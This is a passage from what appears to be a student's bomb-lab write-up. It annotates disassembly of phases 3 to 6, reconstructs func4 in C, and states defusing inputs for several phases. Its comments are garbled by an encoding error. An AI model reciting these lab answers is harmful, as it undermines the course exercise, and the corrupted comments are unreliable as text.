%rax 1d37:\t4c 8d 4e 0c lea 0xc(%rsi),%r9 1d3b:\t4c 8d 46 08 lea 0x8(%rsi),%r8 1d3f:\t48 8d 35 b6 15 00 00 lea 0x15b6(%rip),%rsi # 32fc \u0026lt;array.0+0x1fc\u0026gt; è¿™é‡Œåº”è¯¥æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ•°å­— int sscanf(const char *str, const char *format, ...); 1d46:\tb8 00 00 00 00 mov $0x0,%eax # åˆ†æä¸€ä¸‹sscanfçš„å‚æ•° rdi:å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„string,rsiæ˜¯æ ¼å¼,å°±æ˜¯\u0026#34;%d %d %d %d %d %d\u0026#34;,rdxæ˜¯ç¬¬ä¸€ä¸ªæ•°,rcxæ˜¯ç¬¬äºŒä¸ªæ•°,r8æ˜¯ç¬¬ä¸‰ä¸ªæ•°,r9æ˜¯ç¬¬å››ä¸ªæ•°,ç°åœ¨å¯„å­˜å™¨ä¸å¤Ÿç”¨ï¼Œç”¨æ ˆä¼ é€’å‚æ•°ï¼Œå¹¶ä¸”æ˜¯ä»å³å‘å·¦çš„è¿™å°±å¾ˆå¥½ç†è§£äº† 1d4b:\te8 b0 f5 ff ff call 1300 \u0026lt;__isoc99_sscanf@plt\u0026gt; #è¿™é‡Œè¦è°ƒç”¨sscanfå‡½æ•° 1d50:\t48 83 c4 10 add $0x10,%rsp 1d54:\t83 f8 05 cmp $0x5,%eax 1d57:\t7e 05 jle 1d5e \u0026lt;read_six_numbers+0x40\u0026gt; 1d59:\t48 83 c4 08 add $0x8,%rsp 1d5d:\tc3 ret 1d5e:\te8 63 ff ff ff call 1cc6 \u0026lt;explode_bomb\u0026gt; phase3: # æœ¬å±‚å°±æ˜¯å…³äºä¸€äº›æ¡ä»¶çš„åˆ¤æ–­(å¤§æ¦‚å°±æ˜¯switchè¯­å¥)ï¼ˆç†è§£æå‡äº†ï¼Œä¹‹å‰è‡ªå·±è‚¯å®šæ²¡åŠæ³•åšå‡ºæ¥çš„ï¼‰ï¼š\n000000000000163d \u0026lt;phase_3\u0026gt;: # æé†’æ˜¯å…³äºswitchè¯­å¥,ä¸æ˜¯å“¥ä»¬æ˜¯å¦æœ‰äº›å¤ªé•¿äº† 163d:\tf3 0f 1e fa endbr64 # æˆ‘ä»¬æŒ‰ç…§çº¿æ€§çš„æ–¹æ³•å…ˆèµ°ä¸€éç¨‹åº 1641:\t48 83 ec 28 sub $0x28,%rsp # åˆ†é…äº†40ä¸ªå­—èŠ‚ 1645:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # é‡‘ä¸é›€å€¼ 164c:\t00 00 164e:\t48 89 44 24 18 mov %rax,0x18(%rsp) # é‡‘ä¸é›€å€¼æ”¾åœ¨24ä¸ªå­—èŠ‚å¼€å§‹çš„ä½ç½® 1653:\t31 c0 xor %eax,%eax # æ£€æŸ¥ 1655:\t48 8d 4c 24 0f lea 0xf(%rsp),%rcx # rcx = rsp + 15 å ä¸€ä¸ªå­—èŠ‚ ç¬¬å››ä¸ªå‚æ•° a2 165a:\t48 8d 54 24 10 lea 0x10(%rsp),%rdx # rdx = rsp + 16 å å››ä¸ªå­—èŠ‚ ç¬¬ä¸‰ä¸ªå‚æ•° a1 165f:\t4c 8d 44 24 14 lea 0x14(%rsp),%r8 # r8 = rsp + 20 å å››ä¸ªå­—èŠ‚ ç¬¬äº”ä¸ªå‚æ•° a3 1664:\t48 8d 35 5e 1a 00 00 lea 0x1a5e(%rip),%rsi # 30c9 \u0026lt;_IO_stdin_used+0xc9\u0026gt; è¿™é‡Œçš„rsiæ˜¯\u0026#34;%d %c %d\u0026#34; 166b:\te8 90 fc ff ff call 1300 \u0026lt;__isoc99_sscanf@plt\u0026gt; 1670:\t83 f8 02 cmp $0x2,%eax # sscanfçš„è¿”å›å€¼æ˜¯è¯»å–çš„å‚æ•°çš„ä¸ªæ•°,è‹¥å‚æ•°å°äº2é”™ 1673:\t7e 20 jle 1695 \u0026lt;phase_3+0x58\u0026gt; 1675:\t83 7c 24 10 07 cmpl $0x7,0x10(%rsp) # a1å¤§äº7å°±çˆ†ç‚¸ 167a:\t0f 87 0a 01 00 00 ja 178a \u0026lt;phase_3+0x14d\u0026gt; 1680:\t8b 44 24 10 mov 0x10(%rsp),%eax # rax = a1(æˆ‘ä»¬å…ˆå‡è®¾a1 = 6) 1684:\t48 8d 15 55 1a 00 00 lea 0x1a55(%rip),%rdx # 30e0 \u0026lt;_IO_stdin_used+0xe0\u0026gt; rdxä¸­åŠ è½½äº†ä¸€ä¸ª-68? 168b:\t48 63 04 82 movslq (%rdx,%rax,4),%rax # rax = 4 * rax + rdx 168f:\t48 01 d0 add %rdx,%rax # rax = rax + rdx(å¯èƒ½æ˜¯è·³è¡¨ä½ç½®çš„è®¡ç®—ï¼Ÿ) 1692:\t3e ff e0 notrack jmp *%rax # å…¶ä½œç”¨æ˜¯ è·³è½¬åˆ° RAX å¯„å­˜å™¨å­˜å‚¨çš„åœ°å€ï¼Œå¹¶ä¸”ä¸è®°å½• return address åˆ° å½±å­è°ƒç”¨æ ˆï¼ˆShadow Stack 1695:\te8 2c 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 169a:\teb d9 jmp 1675 \u0026lt;phase_3+0x38\u0026gt; 169c:\tb8 77 00 00 00 mov $0x77,%eax 16a1:\t81 7c 24 14 a8 01 00 cmpl $0x1a8,0x14(%rsp) 16a8:\t00 16a9:\t0f 84 e5 00 00 00 je 1794 \u0026lt;phase_3+0x157\u0026gt; 16af:\te8 12 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 16b4:\tb8 77 00 00 00 mov $0x77,%eax 16b9:\te9 d6 00 00 00 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 16be:\tb8 70 00 00 00 mov $0x70,%eax 16c3:\t81 7c 24 14 bc 00 00 cmpl $0xbc,0x14(%rsp) 16ca:\t00 16cb:\t0f 84 c3 00 00 00 je 1794 \u0026lt;phase_3+0x157\u0026gt; 16d1:\te8 f0 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 16d6:\tb8 70 00 00 00 mov $0x70,%eax 16db:\te9 b4 00 00 00 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 16e0:\tb8 78 00 00 00 mov $0x78,%eax 16e5:\t81 7c 24 14 40 03 00 cmpl $0x340,0x14(%rsp) 16ec:\t00 16ed:\t0f 84 a1 00 00 00 je 1794 \u0026lt;phase_3+0x157\u0026gt; 16f3:\te8 ce 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 16f8:\tb8 78 00 00 00 mov $0x78,%eax 16fd:\te9 92 00 00 00 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 1702:\tb8 6e 00 00 00 mov $0x6e,%eax 1707:\t83 7c 24 14 39 cmpl $0x39,0x14(%rsp) 170c:\t0f 84 82 00 00 00 je 1794 \u0026lt;phase_3+0x157\u0026gt; 1712:\te8 af 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1717:\tb8 6e 00 00 00 mov $0x6e,%eax 171c:\teb 76 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 171e:\tb8 74 00 00 00 mov $0x74,%eax 1723:\t81 7c 24 14 c4 03 00 cmpl $0x3c4,0x14(%rsp) 172a:\t00 172b:\t74 67 je 1794 \u0026lt;phase_3+0x157\u0026gt; 172d:\te8 94 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1732:\tb8 74 00 00 00 mov $0x74,%eax 1737:\teb 5b jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 1739:\tb8 67 00 00 00 mov $0x67,%eax 173e:\t81 7c 24 14 95 03 00 cmpl $0x395,0x14(%rsp) 1745:\t00 1746:\t74 4c je 1794 \u0026lt;phase_3+0x157\u0026gt; 1748:\te8 79 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 174d:\tb8 67 00 00 00 mov $0x67,%eax 1752:\teb 40 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 1754:\tb8 71 00 00 00 mov $0x71,%eax # a1å°äº7ä¼šè·³è½¬åˆ°è¿™é‡Œ eax = 71,è¿™é‡Œå·²ç»é‡æ–°èµ‹å€¼äº† 1759:\t81 7c 24 14 f2 01 00 cmpl $0x1f2,0x14(%rsp) # çœ‹ç¬¬ä¸‰ä¸ªå‚æ•°çš„å€¼,ä¸ç­‰äº498å°±çˆ†ç‚¸ 1760:\t00 1761:\t74 31 je 1794 \u0026lt;phase_3+0x157\u0026gt; 1763:\te8 5e 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1768:\tb8 71 00 00 00 mov $0x71,%eax 176d:\teb 25 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 176f:\tb8 6e 00 00 00 mov $0x6e,%eax 1774:\t81 7c 24 14 83 03 00 cmpl $0x383,0x14(%rsp) 177b:\t00 177c:\t74 16 je 1794 \u0026lt;phase_3+0x157\u0026gt; 177e:\te8 43 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1783:\tb8 6e 00 00 00 mov $0x6e,%eax 1788:\teb 0a jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 178a:\te8 37 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 178f:\tb8 6e 00 00 00 mov $0x6e,%eax 1794:\t38 44 24 0f cmp %al,0xf(%rsp) # ç­‰äº498çš„æƒ…å†µä¸‹æ¥åˆ°è¿™é‡Œ,çœ‹è¾“å…¥çš„å­—ç¬¦å’Œalçš„å€¼æ˜¯å¦ç›¸ç­‰ï¼ŒæŸ¥ASCIIè¿™é‡Œåº”è¯¥æ˜¯G 1798:\t75 15 jne 17af \u0026lt;phase_3+0x172\u0026gt; # ä¸ç›¸ç­‰çˆ†ç‚¸ 179a:\t48 8b 44 24 18 mov 0x18(%rsp),%rax # ç¬¬äºŒä¸ªæ˜¯qï¼ŒOKç»“æŸï¼Œå®Œå…¨ä¸çŸ¥é“å…·ä½“çš„switchä½†æ˜¯èƒ½åš 179f:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 17a6:\t00 00 17a8:\t75 0c jne 17b6 \u0026lt;phase_3+0x179\u0026gt; 17aa:\t48 83 c4 28 add $0x28,%rsp 17ae:\tc3 ret 17af:\te8 12 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 17b4:\teb e4 jmp 179a \u0026lt;phase_3+0x15d\u0026gt; 17b6:\te8 95 fa ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; phase4: # å…³äºé€’å½’å‡½æ•°ï¼Ÿ\nè¿™æ˜¯phase4ä¸­è°ƒç”¨çš„æ–¹æ³•ï¼š\n00000000000017bb \u0026lt;func4\u0026gt;: # å¼€å§‹çš„å‚æ•° edi:a1(x1) esi:0(x2) edx:14(x3) è®¾è¿”å›å€¼ä¸ºx 17bb:\tf3 0f 1e fa endbr64 # è¿™åº”è¯¥æ˜¯ä¸€ä¸ªé€’å½’å‡½æ•° 17bf:\t53 push %rbx # ä¸´æ—¶å˜é‡ (temp) 17c0:\t89 d0 mov %edx,%eax # x = x3 17c2:\t29 f0 sub %esi,%eax # x -= x2 17c4:\t89 c3 mov %eax,%ebx # temp = x 17c6:\tc1 eb 1f shr $0x1f,%ebx # è¿™é‡Œç›¸å½“äºæ˜¯å–äº†tempçš„ç¬¦å· 17c9:\t01 c3 add %eax,%ebx # temp += x 17cb:\td1 fb sar %ebx # temp /= 2(è¿™é‡Œå°±æ˜¯é»˜è®¤çœç•¥äº†1,æ„šè ¢) 17cd:\t01 f3 add %esi,%ebx # temp += x2 17cf:\t39 fb cmp %edi,%ebx # æ¯”è¾ƒå’Œx1ç›¸ä¸ç›¸ç­‰ 17d1:\t7f 06 jg 17d9 \u0026lt;func4+0x1e\u0026gt; # å¦‚æœå¤§äº\u0026gt; 17d3:\t7c 10 jl 17e5 \u0026lt;func4+0x2a\u0026gt; # å¦‚æœå°äº\u0026lt; 17d5:\t89 d8 mov %ebx,%eax # x = temp 17d7:\t5b pop %rbx 17d8:\tc3 ret 17d9:\t8d 53 ff lea -0x1(%rbx),%edx # å¤§äºx1çš„æƒ…å†µ x3 = temp - 1 17dc:\te8 da ff ff ff call 17bb \u0026lt;func4\u0026gt; # é€’å½’è°ƒç”¨ 17e1:\t01 c3 add %eax,%ebx # temp += x 17e3:\teb f0 jmp 17d5 \u0026lt;func4+0x1a\u0026gt; # è¿”å› 17e5:\t8d 73 01 lea 0x1(%rbx),%esi # å°äºçš„æƒ…å†µ x1 = temp + 1 17e8:\te8 ce ff ff ff call 17bb \u0026lt;func4\u0026gt; # é€’å½’è°ƒç”¨ 17ed:\t01 c3 add %eax,%ebx # temp += x 17ef:\teb e4 jmp 17d5 \u0026lt;func4+0x1a\u0026gt; # è¿”å› 00000000000017f1 \u0026lt;phase_4\u0026gt;: 17f1:\tf3 0f 1e fa endbr64 17f5:\t48 83 ec 18 sub $0x18,%rsp # åˆ†é…24ä¸ªå­—èŠ‚ 17f9:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # é‡‘ä¸é›€å€¼ 1800:\t00 00 1802:\t48 89 44 24 08 mov %rax,0x8(%rsp) # æŠŠé‡‘ä¸é›€å€¼æ”¾åˆ°äº†stackä¸Šé¢ 1807:\t31 c0 xor %eax,%eax 1809:\t48 8d 4c 24 04 lea 0x4(%rsp),%rcx # æ ˆä¸Šå‚æ•°ä¼ é€’ ç¬¬å››ä¸ªå‚æ•° 4å­—èŠ‚ a2 180e:\t48 89 e2 mov %rsp,%rdx # ç¬¬ä¸‰ä¸ªå‚æ•° 4å­—èŠ‚ a1 1811:\t48 8d 35 f0 1a 00 00 lea 0x1af0(%rip),%rsi # å‚æ•°æ ¼å¼ï¼š\u0026#34;%d %d\u0026#34; 1818:\te8 e3 fa ff ff call 1300 \u0026lt;__isoc99_sscanf@plt\u0026gt; 181d:\t83 f8 02 cmp $0x2,%eax # æ˜¯å¦è¯»å–æ­£ç¡® 1820:\t75 06 jne 1828 \u0026lt;phase_4+0x37\u0026gt; # ä¸æ­£ç¡®çˆ†ç‚¸ 1822:\t83 3c 24 0e cmpl $0xe,(%rsp) # a1 \u0026lt;= 14ä¸ç„¶çˆ†ç‚¸ 1826:\t76 05 jbe 182d \u0026lt;phase_4+0x3c\u0026gt; 1828:\te8 99 04 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; # a1 \u0026lt;= 14è·³åˆ°è¿™é‡Œ è¿™é‡Œå¤§æ¦‚æ˜¯ä¸ºè°ƒç”¨f4åšå‡†å¤‡ 182d:\tba 0e 00 00 00 mov $0xe,%edx # ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯14 1832:\tbe 00 00 00 00 mov $0x0,%esi # ç¬¬äºŒä¸ªå‚æ•°æ˜¯0 1837:\t8b 3c 24 mov (%rsp),%edi # ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯a1 183a:\te8 7c ff ff ff call 17bb \u0026lt;func4\u0026gt; # è°ƒç”¨äº†f4,é‚£å°±æ˜¯è¯´æˆ‘ä»¬æ ¹æ®f4çš„é€»è¾‘æ¥è®¾ç½®a1çš„è¾“å…¥ 183f:\t83 f8 12 cmp $0x12,%eax # å°†è¿”å›å€¼å’Œ18ä½œæ¯”è¾ƒ 1842:\t75 07 jne 184b \u0026lt;phase_4+0x5a\u0026gt; # ä¸ç›¸åŒå°±çˆ†ç‚¸ 1844:\t83 7c 24 04 12 cmpl $0x12,0x4(%rsp) # æŠŠa2å’Œ18ä½œæ¯”è¾ƒ 1849:\t74 05 je 1850 \u0026lt;phase_4+0x5f\u0026gt; # ä¸ç›¸åŒçˆ†ç‚¸ï¼Œç›¸åŒç»“æŸ 184b:\te8 76 04 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1850:\t48 8b 44 24 08 mov 0x8(%rsp),%rax 1855:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 185c:\t00 00 185e:\t75 05 jne 1865 \u0026lt;phase_4+0x74\u0026gt; 1860:\t48 83 c4 18 add $0x18,%rsp 1864:\tc3 ret 1865:\te8 e6 f9 ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; æˆ‘å¯¹äºfun4åšäº†é€†å‘ï¼š\n#include\u0026lt;stdio.h\u0026gt; //æ‰‹åŠ¨é€†å‘ä»£ç fun4 int fun4(int num1, int num2, int num3){ int x = num3 - num2; int temp = x; if(temp \u0026lt; 0){ ++temp; } temp /= 2; temp += num2; if(temp \u0026gt; num1){ //è¦æ³¨æ„è°ƒç”¨å®Œæˆä¹‹åè·å–çš„raxçš„ä½¿ç”¨ï¼ˆå› ä¸ºè¿™é‡Œåªè°ƒç”¨ä½†æ²¡æœ‰è·å–å€¼æµªè´¹äº†å¾ˆé•¿æ—¶é—´ï¼‰ return fun4(num1, num2, temp - 1) + temp; }else if(temp \u0026lt; num1){ return fun4(num1, temp + 1, num3) + temp; }else{ return temp; } } //å°±æ˜¯ç»™ä¸€ä¸ªè¾“å…¥ï¼Œä½¿å¾—è¿”å›å€¼ä¸º0x12 int main(){ int num1; //scanf(\u0026#34;%d\u0026#34;, \u0026amp;num1); //å½“è¾“å…¥11æ—¶ï¼Œç­”æ¡ˆä¸º18,ä¹Ÿå°±æ˜¯answer int value = fun4(11, 0, 0xe); printf(\u0026#34;%d\\n\u0026#34;, value); } phase5: # hintï¼šæˆ‘çš„è¾“å…¥å’Œarrayä¹‹é—´çš„è½¬æ¢å…³ç³»,ä¹Ÿä¸æ˜¯å¾ˆéš¾\nphase5:\n000000000000186a \u0026lt;phase_5\u0026gt;: 186a:\tf3 0f 1e fa endbr64 186e:\t53 push %rbx # ä¸€ä¸ªå±€éƒ¨å˜é‡ 186f:\t48 83 ec 10 sub $0x10,%rsp # å¼€äº†16å­—èŠ‚ç©ºé—´ 1873:\t48 89 fb mov %rdi,%rbx # å±€éƒ¨å˜é‡å­˜æ”¾rdi,rdiå°±æ˜¯å­—ç¬¦ä¸²çš„é¦–åœ°å€ 1876:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # é‡‘ä¸é›€å€¼ 187d:\t00 00 187f:\t48 89 44 24 08 mov %rax,0x8(%rsp) # æ”¾åœ¨æ ˆä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´æœ‰8å­—èŠ‚çš„å¯ç”¨ç©ºé—´ 1884:\t31 c0 xor %eax,%eax # æ ¡éªŒ 1886:\te8 06 03 00 00 call 1b91 \u0026lt;string_length\u0026gt; # è°ƒç”¨string_length,è¿™é‡Œåº”è¯¥æ˜¯rdiä½œä¸ºå‚æ•°è¯»å…¥äº†ä¸€ä¸ªstring 188b:\t83 f8 06 cmp $0x6,%eax # è¿”å›å€¼å’Œ6æ¯”è¾ƒï¼Œä¸ç›¸ç­‰çˆ†ç‚¸ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²çš„é•¿åº¦è¦æ˜¯6æ‰å¯ä»¥ 188e:\t75 55 jne 18e5 \u0026lt;phase_5+0x7b\u0026gt; 1890:\tb8 00 00 00 00 mov $0x0,%eax # eax = 0ï¼Ÿä¸‹é¢å¤§æ¦‚æ˜¯ä¸ºstrings_not_equalåšå‡†å¤‡ï¼Œä¸ç›¸ç­‰çˆ†ç‚¸ 1895:\t48 8d 0d 64 18 00 00 lea 0x1864(%rip),%rcx # maduiersnfotvbylWow! You\u0026#39;ve defused the secret stage! 189c:\t0f b6 14 03 movzbl (%rbx,%rax,1),%edx # å°±æ˜¯æˆ‘è¾“å…¥æ•°å­—,ä»ä¸Šé¢è¿™ä¸ªstirngä¸­æ‰¾å€¼ï¼Œæ„é€ ä¸€ä¸ªrdi 18a0:\t83 e2 0f and $0xf,%edx 18a3:\t0f b6 14 11 movzbl (%rcx,%rdx,1),%edx 18a7:\t88 54 04 01 mov %dl,0x1(%rsp,%rax,1) 18ab:\t48 83 c0 01 add $0x1,%rax 18af:\t48 83 f8 06 cmp $0x6,%rax # raxå°±æ˜¯ä¸€ä¸ªindexä½œä¸ºå¾ªç¯æ§åˆ¶é‡ 18b3:\t75 e7 jne 189c \u0026lt;phase_5+0x32\u0026gt; 18b5:\tc6 44 24 07 00 movb $0x0,0x7(%rsp) # æœ€åä¸ºæˆ‘ä»¬æ„é€ çš„å­—ç¬¦ä¸²æ·»åŠ äº†ä¸€ä¸ªç»“æŸç¬¦å· 18ba:\t48 8d 7c 24 01 lea 0x1(%rsp),%rdi 18bf:\t48 8d 35 0c 18 00 00 lea 0x180c(%rip),%rsi # *rsi = \u0026#34;bruins\u0026#34; é€šè¿‡ä¸Šé¢çš„æ“ä½œï¼Œ*rdiè¦ç­‰äº\u0026#34;bruins\u0026#34;æ€ä¹ˆæ“ä½œï¼Ÿ 18c6:\te8 e7 02 00 00 call 1bb2 \u0026lt;strings_not_equal\u0026gt; # æ„æ€å°±æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸ç›¸åŒå°±çˆ†ç‚¸ 18cb:\t85 c0 test %eax,%eax 18cd:\t75 1d jne 18ec \u0026lt;phase_5+0x82\u0026gt; 18cf:\t48 8b 44 24 08 mov 0x8(%rsp),%rax 18d4:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 18db:\t00 00 18dd:\t75 14 jne 18f3 \u0026lt;phase_5+0x89\u0026gt; 18df:\t48 83 c4 10 add $0x10,%rsp 18e3:\t5b pop %rbx 18e4:\tc3 ret 18e5:\te8 dc 03 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 18ea:\teb a4 jmp 1890 \u0026lt;phase_5+0x26\u0026gt; 18ec:\te8 d5 03 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 18f1:\teb dc jmp 18cf \u0026lt;phase_5+0x65\u0026gt; 18f3:\te8 58 f9 ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; æˆ‘ä»¬ä¸å¿…ç»†ç©¶å®ƒè°ƒç”¨çš„ä¸¤ä¸ªæ–¹æ³•çš„å…·ä½“å®ç°äº†ï¼Œå°±å’Œå‡½æ•°åå­—ä¸€æ ·ã€‚æˆ‘è¾“å…¥çš„stringæ˜¯\u0026quot;M63487\u0026quot;,å› ä¸ºå®é™…ä¸Šä¼šå’Œ0xfä½œä¸è¿ç®—ï¼Œæ‰€ä»¥æ¯ä¸ªå­—ç¬¦éƒ½æ˜¯å¯é€‰çš„ã€‚\nphase6: # [!CAUTION]\nåº”è¯¥æ˜¯æœ€éš¾çš„ä¸€å±‚äº†ï¼Œhintï¼šé“¾è¡¨ï¼Œé‚£å°±è¦ç”¨åˆ°ç»“æ„ä½“äº†å§ã€‚ï¼ˆåšå®Œï¼šå…¶å®è¿˜å¥½ï¼Œåªè¦ä½ ç†è§£å®ƒåœ¨å¹²ä»€ä¹ˆã€‚ï¼‰\n00000000000018f8 \u0026lt;phase_6\u0026gt;: 18f8:\tf3 0f 1e fa endbr64 # å…³äºé“¾è¡¨æ“ä½œ,æœ€é€†å¤©çš„ä¸€å±‚ï¼Œå­©å­ä»¬ 18fc:\t41 57 push %r15 # 6ä¸ªå±€éƒ¨å˜é‡,éƒ½æ˜¯æ‹¿æ¥å¹²å˜›çš„ï¼Ÿï¼Ÿï¼Ÿ 18fe:\t41 56 push %r14 1900:\t41 55 push %r13 1902:\t41 54 push %r12 1904:\t55 push %rbp 1905:\t53 push %rbx 1906:\t48 83 ec 78 sub $0x78,%rsp # åˆ†é…120ä¸ªbytes 190a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # é‡‘ä¸é›€å€¼ 1911:\t00 00 1913:\t48 89 44 24 68 mov %rax,0x68(%rsp) # æ”¾åˆ°æ ˆä¸Šï¼Œæœ‰104ä¸ªbytesæ˜¯å¯ç”¨çš„ 1918:\t31 c0 xor %eax,%eax # æ£€æµ‹é‡‘ä¸é›€å€¼ 191a:\t4c 8d 74 24 10 lea 0x10(%rsp),%r14 # æ­¤æ—¶r14å­˜æ”¾çš„æ˜¯rsp + 16çš„åœ°å€ 191f:\t4c 89 74 24 08 mov %r14,0x8(%rsp) # æŠŠrsp + 16çš„åœ°å€æ”¾åœ¨rsp + 8çš„ä½ç½® 1924:\t4c 89 f6 mov %r14,%rsi # æŠŠrsp + 16çš„åœ°å€ä½œä¸ºç¬¬äºŒä¸ªå‚æ•° 1927:\te8 f2 03 00 00 call 1d1e \u0026lt;read_six_numbers\u0026gt; # è¯»å–äº†å…­ä¸ªæ•°å­— rsp + 16 20 24 28 32 36æ”¾åœ¨è¿™å…­ä¸ªä½ç½® 192c:\t4d 89 f4 mov %r14,%r12 # r12ä¸­æ”¾ rsp + 16çš„åœ°å€ 192f:\t41 bf 01 00 00 00 mov $0x1,%r15d # r15 = 1 1935:\t4d 89 f5 mov %r14,%r13 # r13ä¸­æ”¾ rsp + 16çš„åœ°å€ 1938:\te9 c6 00 00 00 jmp 1a03 \u0026lt;phase_6+0x10b\u0026gt; # è·³è½¬ 193d:\te8 84 03 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1942:\te9 ce 00 00 00 jmp 1a15 \u0026lt;phase_6+0x11d\u0026gt; 1947:\t48 83 c3 01 add $0x1,%rbx # rbxåˆšåˆšä¸º1,è¿™é‡Œå°±æ˜¯ä½œä¸ºä¸€ä¸ªå¾ªç¯æ§åˆ¶å˜é‡ ++indexï¼ˆç¬¬äºŒå±‚å¾ªç¯ï¼‰ 194b:\t83 fb 05 cmp $0x5,%ebx # å’Œ5æ¯”è¾ƒ 194e:\t0f 8f a7 00 00 00 jg 19fb \u0026lt;phase_6+0x103\u0026gt; # å¦‚æœå¤§äº5è·³è½¬ 1954:\t41 8b 44 9d 00 mov 0x0(%r13,%rbx,4),%eax # r15å°äº5çš„æƒ…å†µï¼šeaxä¸­å­˜æ”¾ *(rsp + 4 * index) 1959:\t39 45 00 cmp %eax,0x0(%rbp) # å’Œé¦–å…ƒç´ åšæ¯”è¾ƒ 195c:\t75 e9 jne 1947 \u0026lt;phase_6+0x4f\u0026gt; # ä¸ç›¸ç­‰è·³è½¬ï¼Œç›¸ç­‰ç›´æ¥çˆ†ç‚¸ 195e:\te8 63 03 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1963:\teb e2 jmp 1947 \u0026lt;phase_6+0x4f\u0026gt; 1965:\t48 8b 54 24 08 mov 0x8(%rsp),%rdx # è‡³æ­¤è¾“å…¥æ£€æŸ¥å·²ç»ç»“æŸ,rdx = rsp + 16ï¼ˆä¸è¦æƒ³é”™äº†ï¼Œè¿™é‡Œå­˜æ”¾çš„å€¼æ˜¯rsp + 16ï¼‰ 196a:\t48 83 c2 18 add $0x18,%rdx # rdx = rsp + 36 196e:\tb9 07 00 00 00 mov $0x7,%ecx # rcx = 7 1973:\t89 c8 mov %ecx,%eax # eax = 7 1975:\t41 2b 04 24 sub (%r12),%eax # eaxä¸º7å‡å»æ•°ç»„ä¸­çš„å…ƒç´  1979:\t41 89 04 24 mov %eax,(%r12) # å†æŠŠè¿™ä¸ªå‡äº†ä¹‹åçš„å€¼åŠ è½½å›å» 197d:\t49 83 c4 04 add $0x4,%r12 # ä¸‹ä¸€ä¸ªæ•°å­— 1981:\t4c 39 e2 cmp %r12,%rdx # æ£€æŸ¥ç»ˆæ­¢æ¡ä»¶ 1984:\t75 ed jne 1973 \u0026lt;phase_6+0x7b\u0026gt; 1986:\tbe 00 00 00 00 mov $0x0,%esi # ç°åœ¨è¾“å…¥çš„æ¯ä¸ªæ•°å­—éƒ½æˆäº†å®ƒå¯¹äº7çš„è¡¥ rsi = 0ï¼Œå‡è®¾è¾“å…¥2 6 1 5 4 3 æ­¤æ—¶çš„å€¼å°±æ˜¯ 5 1 6 2 3 4 rsi = 0 198b:\t8b 4c b4 10 mov 0x10(%rsp,%rsi,4),%ecx # rcx = *(rsp + 16 + 4 * rsi) ä¸ºæ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼ 198f:\tb8 01 00 00 00 mov $0x1,%eax # eax = 1 1994:\t48 8d 15 75 38 00 00 lea 0x3875(%rip),%rdx # gdbæŸ¥çœ‹å†…å­˜è¿™é‡Œå°±æ˜¯æŠŠä¸€ä¸ªé“¾è¡¨çš„node1çš„åœ°å€åŠ è½½ç»™äº†rdx,å°è¯•ç”¨gdbå»æŸ¥çœ‹é“¾è¡¨çš„å…·ä½“ç»“æ„ï¼Œå¤§æ¦‚å°±æ˜¯ç»“æ„ä½“{value + key + nextAddress} 199b:\t83 f9 01 cmp $0x1,%ecx # rcxå¤„çš„å€¼å’Œ1æ¯”è¾ƒ 199e:\t7e 0b jle 19ab \u0026lt;phase_6+0xb3\u0026gt; # å°äºç­‰äº1å°±è·³è½¬ 19a0:\t48 8b 52 08 mov 0x8(%rdx),%rdx # rdxæ­¤æ—¶åº”è¯¥ä¸ºèŠ‚ç‚¹æŒ‡å‘çš„èŠ‚ç‚¹çš„åœ°å€ 19a4:\t83 c0 01 add $0x1,%eax # ++eax 19a7:\t39 c8 cmp %ecx,%eax # rcxå’Œ eaxæ¯”è¾ƒ 19a9:\t75 f5 jne 19a0 \u0026lt;phase_6+0xa8\u0026gt; # ä¸ç›¸ç­‰è·³è½¬ï¼Œç›´åˆ°æ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼å’Œé“¾è¡¨ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„å€¼ç›¸ç­‰å°±è·³è½¬ 19ab:\t48 89 54 f4 30 mov %rdx,0x30(%rsp,%rsi,8) # *(rsp + 48 + 8 * rsi) = rdx æŠŠè¿™ä¸ªåœ°å€å­˜æ”¾åœ¨stackä¸Šé¢ 19b0:\t48 83 c6 01 add $0x1,%rsi # 